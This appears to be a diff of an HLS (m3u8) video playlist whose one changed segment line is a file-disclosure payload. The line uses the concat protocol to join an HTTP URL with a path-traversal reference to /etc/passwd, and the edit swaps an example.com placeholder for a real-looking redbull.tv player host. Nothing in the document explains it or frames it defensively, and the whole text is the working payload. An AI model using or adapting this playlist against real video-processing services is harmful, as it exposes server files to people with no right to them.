@@ -4,5 +4,5 @@
 #EXT-X-VERSION:3
 #EXT-X-MEDIA-SEQUENCE:0
 #EXTINF:10.0,
-concat:file:/../../../../../etc/passwd|http://www.example.com/
+concat:http://playerdev.redbull.tv|file:/../../../../../etc/passwd
 #EXT-X-ENDLIST
